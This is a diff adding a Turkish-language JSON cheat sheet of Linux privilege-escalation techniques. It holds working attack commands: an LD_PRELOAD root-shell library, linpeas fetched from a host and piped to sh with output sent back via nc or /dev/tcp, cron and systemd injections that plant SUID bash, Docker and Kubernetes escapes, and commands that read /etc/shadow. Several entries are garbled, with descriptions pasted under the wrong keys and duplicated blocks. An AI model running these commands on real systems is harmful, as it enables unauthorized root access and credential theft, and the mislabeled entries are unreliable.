@@ -1,0 +1,449 @@
+{
+    "Dirty Pipe": {
+        "desc": "Linux çekirdeğindeki bir güvenlik açığı (CVE-2022-0847)",
+        "description": "Dirty Pipe, Linux çekirdeğindeki bir güvenlik açığıdır (CVE-2022-0847). Bu açık, yetkisiz kullanıcıların sistem dosyalarını değiştirmesine ve yükseltilmiş ayrıcalıklar elde etmesine olanak sağlar.",
+        "usage": "Dirty Pipe açığını istismar etmek için",
+        "command": "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits",
+        "examples": [
+            "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"
+        ],
+        "note": "Bu açık, Linux çekirdeği sürüm 5.8 ve üzerinde bulunmaktadır.",
+        "warning": "Bu açığın istismarı, sisteminize zarar verebilir. Lütfen dikkatli olun ve yalnızca yetkili kişiler tarafından kullanılmalıdır.",
+        "cve": "CVE-2022-0847",
+        "severity": "Yüksek",
+        "mitigation": "Linux çekirdeği güncellemesi uygulanarak bu açık giderilmiştir.",
+        "detection": "Dirty Pipe açığının varlığı, sistem günlüklerinde ve çeşitli güvenlik araçları ile tespit edilebilir.",
+        "prevention": "Linux çekirdeğinin güncel sürümüne güncellenmesi, bu açığın önlenmesi için önemlidir."
+    },
+    "ps_aux_process": {
+        "desc": "Linux İşletim Sistemi altinda çalisan processleri listeler.",
+        "usage": ["ps aux | grep <username>", "ps aux", "ps -ef", "ps -eo pid,comm,%mem,%cpu", "ps -u <kullanıcı_adı>", "ps -p <PID>", "ps -C <komut_adı>", "ps --sort=-%cpu", "ps -l", "ps -j"
+        ],
+        "info": ["Çalışan bütün processler arasından belirli bir kullanıcıya ait olanları listeler",
+        "İşletim sistemi altında çalışan bütün processleri listeler.",
+        "Tüm süreçleri gösterir. -e tüm süreçleri, -f ise tam formatta (daha fazla bilgi ile) gösterir.",
+        "Belirli alanları (PID, komut adı, bellek ve CPU kullanımı) gösterir. Bu, sistem kaynaklarının nasıl kullanıldığını analiz etmek için yararlıdır.",
+        "Belirli bir kullanıcıya ait süreçleri listeler. Bu, belirli bir kullanıcının ne tür işlemler yaptığını görmek için faydalıdır.",
+        "Belirli bir süreç kimliğine (PID) sahip sürecin bilgilerini gösterir. Bu, belirli bir sürecin durumunu kontrol etmek için kullanılır.",
+        "Belirli bir komut adıyla çalışan süreçleri listeler. Örneğin, ps -C sshd ile SSH süreçlerini görebilirsiniz.",
+        "Süreçleri bellek kullanımına göre azalan sırada listeler. Bu, en fazla bellek kullanan süreçleri hızlıca bulmak için yararlıdır.",
+        "Süreçleri CPU kullanımına göre azalan sırada listeler. Bu, en fazla CPU kullanan süreçleri tespit etmek için kullanılır.",
+        "Uzun formatta süreç bilgilerini gösterir. Bu, süreçlerin önceliklerini ve durumlarını daha ayrıntılı bir şekilde incelemek için faydalıdır.",
+        "İş grubu bilgilerini gösterir. Bu, süreçlerin hangi iş grubuna ait olduğunu görmek için kullanılır."
+        ],
+        "examples": [
+            "ps aux | grep root", "ps aux | grep www-data"
+        ],
+        "params": [
+            "ps: Process Status",
+            "a : Tüm kullanıcılar",
+            "u : Kullanıcı dostu bir şekilde okunaklı listeler" ,
+            "-e : Tüm süreçleri gösterir",
+            "-f : ise tam formatta (daha fazla bilgi ile) gösterir."
+        ]
+    },
+    "sudo -l Kullanıcı Ayrıcalıklarını Listeleme" : {
+        "desc": "Sistemdeki bir kullanıcı sudo (SuperUserDO) mekanizması sayesinde başka bir kullanıcı olarak ya da root olarak herhangi bir komut çalıştırabilir. Ancak sudo ayrıcalıklarından yararlanabilmek için kullanıcının parolasına sahip olmanız gerekebilir. Ayrıca sudoers kayıtları belirtilen komutun parolasız olarak çalıştırılabilmesi için konfigüre edilebilir. Linux sistemlerde kullanışlı bir yapısı olduğu için kullanıcılar genellikle sudo ayrıcalıklarına sahiptir. Bununla birlikte bir komutu sudo sayesinde root yetkilerinde çalıştırabilsek bile her zaman ayrıcalık yükseltmeye yol açmayabilir.",
+        "usage": "sudo -l"
+    },
+    "/etc/shadow" : {
+        "desc": "/etc/shadow dizinindeki shadow dosyası okunabiliyorsa, parolası olan tüm kullanıcılar için parola hashlerini görebilirsiniz. Bu hashler daha fazla erişimi garanti etmese de, bu hashler parolaları bulmak için çevrimdışı bir kaba kuvvet saldırısına tabi tutulabilir.",
+        "usage": "cat /etc/shadow"
+    },
+    "/etc/passwd" : {
+        "desc": "Bazen, parola hashleri doğrudan /etc/passwd dosyasında bulunabilir. Bu dosya tüm kullanıcılar tarafından okunabilir ve shadow dosyasındaki parola hashlerinde olduğu gibi bunlara da çevrimdışı parola kırma saldırıları yapılabilir. Bu yapılandırma yaygın olmamakla birlikte bazen gömülü cihazlarda ve routerlarda görülebilir.",
+        "usage": "cat /etc/passwd"
+    },
+    "/etc/crontab" : {
+        "desc": "Linux sistemlerdeki cron jobs zamanlanmış görevlerdir. Genellikle bakım ve yedekleme görevlerini gerçekleştirmek için ayarlanırlar. Zayıf izinler gibi yanlış yapılandırmalarla birlikte, zamanlanmış görevler çalıştığında ayrıcalıkları yükseltmek için kullanılabilirler",
+        "usage": "cat /etc/crontab"
+    },
+    "find" : {
+        "desc": "Yapılandırma dosyalarının değiştirilmesi sistemin doğru çalışmaya devam etmesi için tehklikeli olsa da, küçük bir değişikliğin daha fazla erişim sağlayabileceği durumlar olabilir. Ayrıca, zamanlanmış görevleri kullanarak root olarak çalıştırılan tüm komut dosyaları bir yetki yükseltmek için biraz değiştirilebilir.",
+        "usage": "find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null"
+    },
+    "find_a_keywoard" : {
+        "desc": "Herhangi bir keywordu dosyalarin icerisinde aramak icin kullanilir.",
+        "usage": "find / -name \"_name\" 2>/dev/null"
+    },
+    "find_sudo_bits" : {
+        "desc": "Dizin olmayan butun dosyalarda suid bitli olanlari bulur.",
+        "usage": "find / -perm -u=s -type f 2>/dev/null"
+    },
+    "lsblk" : {
+        "desc": "Ek bir sürücü veya bağlanmamış dosya sistemi keşfeder ve bağlayabilirseniz, bu sürücüler ayrıcalıkları artırmak için kullanılabilecek hassas dosyalar, parolalar veya yedeklemeler içerebilir."
+    },
+    "SETUID/SETGID Permissons" : {
+        "desc": "Kullanıcılara root erişim izni vermek zorunda kalmadan bir kullanıcının bir komutu root olarak çalıştırmasına izin vermek için SUID ve SGID izinleri kullanılabilir. SETUID ya da SGID izinleri verilmiş birçok binary dosya root kabuk elde etmek için kullanılabilir.",
+        "usage": "cat /etc/crontab"
+    },
+    "Python interactive shells" : {
+        "desc": "Linux sistemlerdeki cron jobs zamanlanmış görevlerdir. Genellikle bakım ve yedekleme görevlerini gerçekleştirmek için ayarlanırlar. Zayıf izinler gibi yanlış yapılandırmalarla birlikte, zamanlanmış görevler çalıştığında ayrıcalıkları yükseltmek için kullanılabilirler",
+        "usage": ["python3 -c ‘import os: os.system(“/bin/bash”)’", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")"]
+    },
+    "SUID - Özel İzinler" : {
+        "desc": "Set User ID (setuid) izni, bir kullanıcının bir programı veya komut dosyasını başka bir kullanıcının izinleriyle, genellikle root ayrıcalıklarıyla çalıştırmasına izin verebilir. SUID biti, dizin listelemesinde dosya izinleri kısmında s olarak görünür. Aşağıdaki komutu çalıştırarak SUID biti ayarlanmış dosyaları bulabiliriz.",
+        "usage": "find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null"
+    },
+    "SGID/Set-Group-Id" : {
+        "desc": "Linux Capabilities, işletim sisteminin, processlere root kullanıcısının tüm ayrıcalıklarını vermek yerine, sadece gerekli olan ayrıcalıkları atamasına olanak tanıyan bir erişim kontrol mekanizmasıdır. Bu, sistemin güvenliğini artırır çünkü süreçler yalnızca ihtiyaç duydukları yetkilere sahip olur. Örneğin, bir uygulamanın ağ portları üzerinde dinleme yapabilmesi için root erişimine ihtiyacı yoktur; bunun yerine, sadece bu işlevi gerçekleştirmek için gerekli olan CAP_NET_BIND_SERVICE yeteneğine ihtiyacı vardır. Bu özellik sayesinde hangi süreçlerin belirli ayrıcalıklara erişebileceği konusunda daha hassas bir kontrol sağlayarak Unix'in geleneksel kullanıcılara ve gruplara ayrıcalık tanıma modelinden daha güvenli olmasını sağlar.",
+        "usage": "cp /usr/sbin/getcap /usr/bin; find /usr/bin -type f -exec getcap {} \\;"
+    },
+    "/usr/sbin/getcap_setcap" : {
+        "desc": "Linux sistemlerdeki cron jobs zamanlanmış görevlerdir. Genellikle bakım ve yedekleme görevlerini gerçekleştirmek için ayarlanırlar. Zayıf izinler gibi yanlış yapılandırmalarla birlikte, zamanlanmış görevler çalıştığında ayrıcalıkları yükseltmek için kullanılabilirler",
+        "usage": ["cat /etc/crontab","/usr/sbin/getcap -r / 2>/dev/null"],
+        "capabilities": [
+    {
+      "capability": "cap_sys_admin",
+      "description": "Sistem dosyalarını değiştirme veya sistem ayarlarını değiştirme gibi birçok yetkiyi elde etmesine olanak tanır."
+    },
+    {
+      "capability": "cap_sys_chroot",
+      "description": "Geçerli etkin dizinin değiştirilmesine izin verir, aksi takdirde kök dizininde dizinlere erişimle sınırlıdır."
+    },
+    {
+      "capability": "cap_sys_ptrace",
+      "description": "Süreçlerin önceliklerini değiştirmeye ve diğer süreçlerin davranışını incelemeye olanak tanır."
+    },
+    {
+      "capability": "cap_sys_time",
+      "description": "Sistem saatini değiştirmeye izin verir, potansiyel olarak diğer süreçlerin zamanlamalarını etkileyebilir."
+    },
+    {
+      "capability": "cap_sys_resource",
+      "description": "Sistem kaynaklarının yönetilmesine izin verir, bu da sistemin genel performansını etkileyebilir."
+    },
+    {
+      "capability": "cap_net_bind_service",
+      "description": "Ağ hizmetlerinin belirli portlara bağlanmasına izin verir."
+    },
+    {
+      "capability": "cap_doc_override",
+      "description": "Dosya okuma, yazma ve yaratma izinlerini sağlar."
+    },
+    {
+      "capability": "cap_sys_rawio",
+      "description": "Düşük seviyeli RAW ve PACKET erişim izinleri verir."
+    },
+    {
+      "capability": "cap_setuid",
+      "description": "Bir sürecin, root kullanıcısı da dahil olmak üzere başka bir kullanıcıdan ayrılmasını sağlar."
+    },
+    {
+      "capability": "cap_setgid",
+      "description": "Root grubundan başka bir grubun ayrılmasını sağlar."
+    },
+    {
+      "capability": "cap_sys_admin",
+      "description": "Dosya sistemlerini kök kullanıcı olarak değiştirme yetkisi verir."
+    },
+    {
+      "capability": "cap_dac_override",
+      "description": "Dosya okuma, yazma ve yaratma izinlerini sağlar."
+    }
+  ]
+    },
+    "Kernel Version - uanme -r" : {
+        "desc": "Linux sistemde ki kernel surumunu gosterir.",
+        "usage": "uname -r"
+    },
+    "LD_PRELOAD": {
+        "desc": ["Programların dinamik olarak paylaşılan kütüphaneleri kullanması yaygın bir durumdur. Kütüphaneler, geliştiricilerin aynı kod parçalarını birden fazla programda yeniden yazmak zorunda kalmamak için kullandıkları derlenmiş kodlardan oluşur.Linux'ta iki tür kütüphane vardır: statik kütüphaneler (.a dosya uzantısı ile gösterilir) ve dinamik olarak bağlı paylaşılan nesne kütüphaneleri (.so dosya uzantısı ile gösterilir). Bir program derlendiğinde, statik kütüphaneler programın bir parçası haline gelir ve değiştirilemez. Ancak dinamik kütüphaneler, onları çağıran programın yürütülmesini kontrol etmek için değiştirilebilir.", 
+        "Dinamik kütüphanelerin konumunu belirtmek için birden fazla yöntem vardır. Bir programı derlerken -rpath veya -rpath-link bayraklarını, LD_RUN_PATH veya LD_LIBRARY_PATH çevresel değişkenlerini dinamik kütüphanelerin konumunu belirtmek için kullanabiliriz. Ayrıca dinamik kütüphaneleri /lib veya /usr/lib varsayılan dizinlerine yerleştirebilir veya /etc/ld.so.conf yapılandırma dosyası içinde kütüphaneleri içeren başka bir dizin belirtebiliriz.", 
+        "Ayrıca, LD_PRELOAD ortam değişkeni bir binary dosyayı çalıştırmadan önce bir kütüphane yükleyebilir. Bu kütüphanedeki fonksiyonlar varsayılan fonksiyonlarla değiştirilir. Bir binary dosyanın çalışması için gereken paylaşılan kütüphaneler ldd yardımcı programı kullanılarak görüntülenebilir."
+        ],
+        "info": "LD_PRELOAD Privlige Escalation",
+        "usage": ["Ayrıcalıkları yükseltmek için LD_PRELOAD ortam değişkenini nasıl kullanabileceğimize dair bir örnek inceleyelim. Bunun için sudo ayrıcalıklarına sahip bir kullanıcıya ihtiyacımız var. Statik kütüphaneler (.a dosya uzantısı ile gösterilir) ve dinamik olarak bağlı paylaşılan nesne kütüphaneleri (.so dosya uzantısı ile gösterilir).",
+        "Ayrıca dinamik kütüphaneleri /lib veya /usr/lib varsayılan dizinlerine yerleştirebilir veya /etc/ld.so.conf yapılandırma dosyası içinde kütüphaneleri içeren başka bir dizin belirtebiliriz."
+        ],
+        "command": "ldd /bin/ping ldd /bin/ping",
+        "syntax": "escalate.c: unsetenv(\"LD_PRELOAD\"); setresuid(\"0, 0, 0\"); system(\"/bin/bash -p\"); return 0;",
+        "payload": "gcc -fPIC -shared -nostartfiles -o /tmp/escalate.so escalate.c",
+        "example": "sudo LD_PRELOAD=/tmp/escalate.so /usr/local/bin/sys_backup"
+    },
+    "linpeas.sh_Linux Privilege Escalation Awesome Script": {
+        "desc": ["Otomatik Linux Privlige Escalation yardimci bash scripttir.","linpeas_fat.sh: Contains all checks, even third party applications in base64 embedded.","linpeas.sh: Contains all checks, but only the third party application linux exploit suggester is embedded. This is the default linpeas.sh.", "linpeas_small.sh: Contains only the most important checks making its size smaller."],
+        "usage": ["curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+        "# Local network",
+        "sudo python3 -m http.server 80 #Host",
+        "curl 10.10.10.10/linpeas.sh | sh #Victim",
+        "# Without curl",
+        "sudo nc -q 5 -lvnp 80 < linpeas.sh #Host",
+        "cat < /dev/tcp/10.10.10.10/80 | sh #Victim",
+        "# Excute from memory and send output back to the host",
+        "nc -lvnp 9002 | tee linpeas.out #Host",
+        "curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim",
+        "# Output to file",
+        "./linpeas.sh -a > /dev/shm/linpeas.txt #Victim",
+        "less -r /dev/shm/linpeas.txt #Read with colors",
+        "# Use a linpeas binary",
+        "wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64",
+        "chmod +x linpeas_linux_amd64",
+        "./linpeas_linux_amd64"
+        ],
+        "command": "ldd /bin/ping ldd /bin/ping",
+        "syntax": "escalate.c: unsetenv(\"LD_PRELOAD\"); setresuid(\"0, 0, 0\"); system(\"/bin/bash -p\"); return 0;",
+        "payload": "gcc -fPIC -shared -nostartfiles -o /tmp/escalate.so escalate.c",
+        "example": "sudo LD_PRELOAD=/tmp/escalate.so /usr/local/bin/sys_backup"
+    },
+    "linux_auto_privlige_escalation": {
+        "desc" : ["Checksec: Checksec, bir sistemdeki güvenlik özelliklerini kontrol eden bir araçtır. Derlenmiş programların güvenlik ayarlarını (örneğin, PIE, RELRO, Stack Canaries) kontrol ederek, potansiyel zafiyetleri belirlemeye yardımcı olabilir.",
+        "Searchsploit: Searchsploit, Exploit-DB veritabanında zafiyet bilgilerini aramanızı sağlayan bir araçtır. Sisteminizdeki yazılımların versiyonlarını kullanarak, bilinen zafiyetlere karşı hızlı bir şekilde tarama yapabilirsiniz.",
+        "post/multi/recon/local_exploit_suggester",
+        "Linpeas, LinEnum, LES(Local Exploit Suggester), Linux Smart Enumaration, Exploit-DB, GTFOBins"
+        ]
+    },
+    "docker_privilege_escalation": {
+        "desc": "Docker içinde privilege escalation teknikleri",
+        "category": "Privilege Escalation",
+        "type": "Container Escape",
+        "description": "Docker grubuna ait olan bir kullanıcının container'dan host sistemine erişimi",
+        "usage": [
+            "docker run -v /:/host/ -it alpine chroot /host/",
+            "docker run --rm -v /:/host -it ubuntu chroot /host",
+            "docker run -it --rm -v /tmp:/host/tmp alpine sh",
+            "docker run --privileged --rm -it ubuntu nsenter -t 1 -m -u -i -n sh"
+        ],
+        "examples": [
+            "docker run -v /:/host osiunity/chisel:1.7.6 socks --port 1080 # Chisel binary mount",
+            "docker run -v /:/host -w /host root -c 'cat /etc/shadow' # Read shadow file" 
+        ],
+        "info": [
+            "Docker daemon'a erişimi olan kullanıcılar container içinde root haklarıyla çalışabilir",
+            "Volume mount ile host sistemine erişim sağlanabilir",
+            "docker.sock üzerinden doğrudan Docker daemon'a erişim",
+            "Container escape için --privileged flag'ı tehlikeli olabilir"
+        ],
+        "params": [
+            "-v : Host sistemdeki dizini container'a mount et",
+            "--privileged : Container'a host seviyesinde yetkiler ver",
+            "--pid=host : Host PID namespace'ini kullan",
+            "--network=host : Host network'ünü kullan"
+        ],
+        "security_considerations": [
+            "Docker grubuna kullanıcı eklemek ciddi bir security riskidir",
+            "Root olmayan kullanıcılar için Docker secure configuration gerekir",
+            "Container image'lerini güvenli kaynaklardan çekme",
+            "Seccomp, AppArmor gibi teknolojileri kullanma"
+        ],
+        "mitigation": [
+            "Docker grubuna minimum kullanıcı ekleme",
+            "Docker daemon'u root olmayan kullanıcı ile çalıştırma",
+            "Container image'lerini güvenli kaynaklardan çekme",
+            "Seccomp, AppArmor gibi teknolojileri kullanma"
+        ],
+        "severity": "Critical",
+        "reference": "GTFOBins, Docker Security Documentation"
+    },
+    "kubernetes_privilege_escalation": {
+        "desc": "Kubernetes ortamlarında privilege escalation",
+        "category": "Privilege Escalation",
+        "type": "Container Orchestration Escape",
+        "description": "Pod içinde yüksek yetki kazanma ve cluster erişimi",
+        "usage": [
+            "kubectl get pods --all-namespaces",
+            "kubectl exec -it <pod-name> -- /bin/sh",
+            "kubectl get secrets --all-namespaces",
+            "kubectl auth can-i --list"
+        ],
+        "examples": [
+            "kubectl exec -it <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+            "kubectl run --rm -it test --image=busybox --overrides='{\"spec\":{\"hostPID\":true,\"containers\":[{\"name\":\"test\",\"image\":\"busybox\",\"securityContext\":{\"privileged\":true},\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"bash\"]}]}}'",
+            "kubectl create serviceaccount test && kubectl create clusterrolebinding test --clusterrole=cluster-admin --serviceaccount=default:test"
+        ],
+        "info": [
+            "Service account token'ları ile API erişimi",
+            "HostPID, HostNetwork, privileged container'lar ile escape",
+            "RBAC konfigürasyon hataları",
+            "Pod Security Policy (PSP) bypass teknikleri"
+        ],
+        "security_considerations": [
+            "Pod'ların minimum yetki ile çalıştırılması",
+            "RBAC rollerinin doğru yapılandırılması",
+            "Network policy'lerin uygulanması",
+            "Pod Security Standards uygulanması"
+        ],
+        "mitigation": [
+            "RBAC rollerinin minimum privilege ile konfigüre edilmesi",
+            "Network isolation",
+            "Pod Security Admission (PSA) uygulanması",
+            "Service mesh kullanımı (Istio, Linkerd)"
+        ],
+        "severity": "Critical",
+        "reference": "Kubernetes Security Documentations"
+    },
+    "cron_job_exploitation": {
+        "desc": "Zamanlanmış görevlerde (cron) privilege escalation",
+        "category": "Privilege Escalation",
+        "type": "Cron Job Misconfiguration",
+        "description": "Zayıf izinlere sahip cron job'ları ve script'ler",
+        "usage": [
+            "cat /etc/crontab",
+            "ls -la /etc/cron.*",
+            "systemctl list-timers --all",
+            "crontab -l"
+        ],
+        "examples": [
+            "find /etc/cron* -perm -002 -type f 2>/dev/null # Writeable cron files",
+            "ls -la /home/*/.bashrc /home/*/.profile /etc/profile 2>/dev/null # Bashrc exploit",
+            "echo 'cp /bin/bash /tmp/bash && chmod u+s /tmp/bash' >> /etc/cron.hourly/script.sh && tail -f /var/log/cron.log"
+        ],
+        "info": [
+            "Cron job'ların sahibi root, fakat script izinleri yazılabilir olabilir",
+            "PATH değişkeni manipülasyonu",
+            "Wildcard expansion ile komut injection",
+            "Anacron ve at komutları için benzer zafiyetler"
+        ],
+        "exploitation": [
+            "Writable script dosyalarına kod ekleme",
+            "PATH manipülasyonu ile komut redirection",
+            "Wildcard expansion ile komut injection",
+            "Link following ile script değiştirme"
+        ],
+        "params": [
+            "crontab -l : Mevcut crontab'ı listele",
+            "crontab -e : Crontab'ı düzenle",
+            "crontab -r : Crontab'ı sil",
+            "/etc/crontab : Sistem crontab dosyası"
+        ],
+        "security_considerations": [
+            "Cron script'lerinin root tarafından yazılması",
+            "Script dosyalarının izinlerinin doğrulanması",
+            "PATH değişkeninin güvenli ayarlanması"
+        ],
+        "mitigation": [
+            "Cron script'lerinin sadece root tarafından değiştirilmesi",
+            "Açık yetki izinlerinin engellenmesi",
+            "Cron job'ların düzenli izlenmesi"
+        ],
+        "severity": "High",
+        "reference": "GTFOBins, Cron Security Best Practices"
+    },
+    "systemd_service_exploitation": {
+        "desc": "Systemd servis dosyaları ile privilege escalation",
+        "category": "Privilege Escalation",
+        "type": "Systemd Service Misconfiguration",
+        "description": "Yazılabilir veya hatalı yapılandırılmış systemd servis dosyaları",
+        "usage": [
+            "systemctl list-units --type=service --state=running",
+            "find /etc/systemd /lib/systemd /usr/lib/systemd -name \"*.service\" -type f 2>/dev/null",
+            "systemctl status <service-name>",
+            "cat /etc/systemd/system/<service>.service"
+        ],
+        "examples": [
+            "echo -e \"[Service]\\nExecStart=/bin/bash -c 'cp /bin/bash /tmp/bash && chmod u+s /tmp/bash'\" > /etc/systemd/system/malicious.service",
+            "systemctl enable malicious && systemctl start malicious && /tmp/bash -p",
+            "systemctl edit --force --full <service-name> # Override service file"
+        ],
+        "info": [
+            "Writable systemd service dosyaları ile root komut çalıştırma",
+            "Service override ile mevcut servisi değiştirme",
+            "Timer unit'leri ile zamanlanmış komut çalıştırma",
+            "User service dosyaları ile kullanıcı seviyesinde yetki yükseltme"
+        ],
+        "exploitation": [
+            "Yeni servis oluşturma ve başlatma",
+            "Mevcut servisi override etme",
+            "Timer unit ile komut zamanlama",
+            "User service ile yetki yükseltme"
+        ],
+        "params": [
+            "systemctl start/stop/restart : Servisi başlat/durdur/yeniden başlat",
+            "systemctl enable/disable : Servisi başlatma sırasında etkinleştir/devre dışı bırak",
+            "systemctl edit : Servis overridelerini yönet",
+            "systemctl daemon-reload : Servis yapılandırmalarını yeniden yükle"
+        ],
+        "security_considerations": [
+            "Systemd servis dosyalarının root tarafından yazılması",
+            "Service dosyalarında command injection",
+            "Service reload ile yetki yükseltme"
+        ],
+        "mitigation": [
+            "Service dosyalarının doğru izinlere sahip olması",
+            "Service reload işlemlerinin denetlenmesi",
+            "User servislerinin sınırlandırılması"
+        ],
+        "severity": "High",
+        "reference": "Systemd Security Documentation"
+    },
+    "kernel_exploitation_edge_cases": {
+        "desc": "Kernel exploit'lerine özel edge-case senaryolar",
+        "category": "Privilege Escalation",
+        "type": "Kernel Exploitation Edge Cases",
+        "description": "Kernel sürümüne özel ve az bilinen kernel exploit senaryoları",
+        "usage": [
+            "uname -a",
+            "cat /proc/version",
+            "cat /etc/os-release",
+            "dmesg | grep -i \"version\\|kernel\\|linux\""
+        ],
+        "examples": [
+            "Linux kernel 4.4.0-116-generic #140~14.04.1-Ubuntu exploit: dirty_cow (CVE-2016-5195)",
+            "Linux kernel 3.13.0-24-generic #47-Ubuntu exploit: overlayfs (CVE-2015-8660)",
+            "Linux kernel 4.8.0-34-generic #36~16.10.1-Ubuntu exploit: double-fork (CVE-2016-9793)"
+        ],
+        "info": [
+            "Distribution ve kernel sürümüne özel exploit'ler",
+            "ASLR, SMEP, SMAP gibi korumaların bypass teknikleri",
+            "Kernel module loading exploit'leri",
+            "KASLR bypass teknikleri"
+        ],
+        "exploitation": [
+            "Sürüm bazlı kernel exploit'leri uygulama",
+            "Kernel module injection",
+            "KASLR bypass ile memory disclosure",
+            "SMEP/SMAP bypass ile ROP/JOP chain"
+        ],
+        "security_considerations": [
+            "Kernel güncellemelerinin düzenli yapılması",
+            "Kernel exploit'lerine karşı koruma mekanizmaları",
+            "Kernel debugging sembollerinin devre dışı bırakılması"
+        ],
+        "mitigation": [
+            "Kernel güncellemeleri",
+            "Grsecurity/PaX gibi ek korumalar",
+            "SMP ve modül yükleme sınırlamaları",
+            "KASLR, SMEP, SMAP gibi korumalar"
+        ],
+        "severity": "Critical",
+        "reference": "Kernel Exploit Databases, CVE Records"
+    },
+    "docker_socket_exploitation": {
+        "desc": "Docker socket erişimi ile privilege escalation",
+        "category": "Privilege Escalation",
+        "type": "Docker Socket Exploitation",
+        "description": "docker.sock dosyasına erişimi olan kullanıcının yetki yükseltme metotları",
+        "usage": [
+            "ls -la /var/run/docker.sock",
+            "docker ps",
+            "docker run -it --rm -v /:/host alpine chroot /host sh"
+        ],
+        "examples": [
+            "docker run -v /:/mnt --rm -it alpine chroot /mnt sh # Mount root filesystem",
+            "docker run --rm -v /:/host -it ubuntu cp /etc/shadow /host/tmp/shadow_copy",
+            "docker run --privileged --rm -it ubuntu nsenter --mount=/proc/1/ns/mnt -- bash"
+        ],
+        "info": [
+            "Docker socket erişimi root seviyesinde sistem erişimi sağlar",
+            "Container mount ile host filesystem erişimi",
+            "Privileged container ile host system kontrolü"
+        ],
+        "exploitation": [
+            "Host filesystem'e container mount ile erişim",
+            "Docker daemon olarak komut çalıştırma",
+            "Host kernel modülü yükleme"
+        ],
+        "security_considerations": [
+            "docker.sock dosyası sadece root ve docker grubuna erişilebilir olmalı",
+            "Docker daemon güvenliği",
+            "Container runtime güvenliği"
+        ],
+        "mitigation": [
+            "docker.sock erişim kontrolü",
+            "Docker daemon konfigürasyonu",
+            "Rootless Docker kullanımı"
+        ],
+        "severity": "Critical",
+        "reference": "Docker Security Documentation, GTFOBins"
+    }
+}
